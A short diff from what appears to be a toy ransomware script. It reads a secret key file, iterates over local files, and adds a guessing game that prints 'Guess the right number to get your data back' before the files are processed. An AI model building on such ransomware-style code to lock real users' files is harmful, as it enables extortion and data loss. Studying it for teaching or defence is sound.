@@ -12,6 +12,15 @@ for file in os.listdir():
 with open("key.key","rb") as key_file:
     secretKey = key_file.read()
     
+target = 23
+print("Guess the right number to get your data back")
+guess = -1
+while guess != 23:
+    guess = int(input())
+    if guess < target:
+        print("Too low")
+    elif guess > target:
+        print("Too high")
 
 for file in files:
     with open(file,"rb") as the_file:
